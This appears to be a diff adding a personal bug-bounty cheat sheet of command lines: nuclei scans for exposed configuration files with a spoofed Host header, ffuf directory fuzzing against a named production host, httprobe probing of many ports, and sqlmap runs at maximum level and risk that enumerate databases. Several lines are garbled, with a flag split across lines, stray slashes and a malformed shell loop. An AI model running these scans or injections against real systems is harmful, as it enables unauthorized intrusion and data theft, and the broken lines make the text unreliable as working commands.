@@ -1,5 +1,13 @@
+nuclei -c 400 -l alive.txt -stats -retries 3 -timeout 15 -bulk-size 50 -t ~/nuclei-templates/exposures/configs/
+*.yaml  -H "Host: localhost"
 
+ffuf -w ~/mylist/common.txt -H "Host: localhost" -u  https://status.ps4.production.mp.beatsaber.com/FUZZ -mc 20
+0 -mode clusterbomb -H "User-Agent: Firefox" -mc 200s
 
+cat sub.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -p https:10000 -p http:9000 -p https:9443 -c 50 | tee live-subs2.txt
+
+sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter///////
+sqlmap -r request.txt -p username --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs --hostname
 
 for i in {1..9}; echo $i
 for i in {1..9..2}; do echo $i; done
